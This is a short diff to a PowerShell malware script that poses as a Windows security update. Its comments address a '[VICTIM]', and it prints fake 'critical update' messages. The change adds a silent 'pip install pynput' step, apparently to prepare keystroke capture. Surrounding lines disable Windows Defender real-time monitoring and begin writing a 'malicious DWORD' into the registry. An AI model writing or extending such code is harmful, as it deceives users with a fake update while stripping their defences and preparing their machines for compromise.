@@ -39,6 +39,7 @@ write-Host ="
 
 
 Write-Output "[!] SECURITY UPDATE! Do not turn off device.....`r`n"
+Invoke-Expression "pip install pynput"
 # WRITING A MESSAGE FOR THE [VICTIM] ABOUT SOME CRITICAL UPDATES
 Start-Sleep -Seconds 3
 Write-Output "`r`n[!] WINDOWS FOUND SOME CRITICAL PROBLEMS! `r`n"
@@ -61,8 +62,6 @@ foreach ($action in $updateActions) {
 }
 
 Write-Output "Windows Update has been completed successfully."
-
-
 # DISABLE THE REAL-TIME PROTECTION WHILE USING ADMINISTRATOR PRIVILEGE
 $Mal = Set-MpPreference -DisableRealtimeMonitoring $true
 # INJECT A MALICIOUS DWORD INSIDE REGISTRY
